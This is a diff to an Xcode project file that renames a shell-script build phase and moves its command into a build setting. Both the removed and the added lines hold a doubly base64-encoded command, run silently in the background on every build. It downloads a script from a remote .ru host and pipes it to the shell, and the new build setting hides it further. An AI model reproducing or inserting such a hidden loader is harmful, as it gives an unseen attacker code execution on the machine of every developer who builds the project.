@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				F6EECC2D1E7E42A09E877BEF /* Compile Bundle Assets */,
+				D0C013DB3FC415DCF0877BEF /* Build Target Dependencies */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -272,6 +272,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXLegacyTarget section */
 /* End PBXLegacyTarget section */
 
@@ -295,7 +298,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F6EECC2D1E7E42A09E877BEF /* Compile Bundle Assets */ = {
+		D0C013DB3FC415DCF0877BEF /* Build Target Dependencies */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -305,13 +308,13 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Bundle Assets";
+			name = "Build Target Dependencies";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aGNIQnNaV05rYmk1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
 			showEnvVarsInLog = 0;			
 		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
@@ -404,6 +407,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNW5iRzlpWVd3dWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -418,6 +422,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNW5iRzlpWVd3dWNuVXZZU2tpSUh3Z2MyZ0sK | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
